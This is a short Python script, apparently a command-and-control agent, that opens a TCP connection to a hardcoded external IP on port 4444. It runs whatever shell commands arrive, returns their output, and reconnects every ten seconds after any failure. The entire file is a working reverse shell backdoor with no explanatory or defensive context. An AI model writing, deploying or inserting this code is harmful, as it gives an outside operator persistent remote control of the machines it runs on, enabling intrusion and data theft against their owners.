import socket
import subprocess
import os
import time

# C2 Configuration
C2_IP = "86.44.138.88"  # C2 Server IP
C2_PORT = 4444          # C2 Server Port

def connect_to_c2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            s.send(b"[+] Agent connected.\n")
            
            while True:
                cmd = s.recv(4096).decode().strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    s.close()
                    return
                
                # Execute command and send output
                output = subprocess.getoutput(cmd)
                s.send(output.encode())
                
        except Exception as e:
            time.sleep(10)  # Retry every 10 seconds on failure
            continue

if __name__ == "__main__":
    connect_to_c2()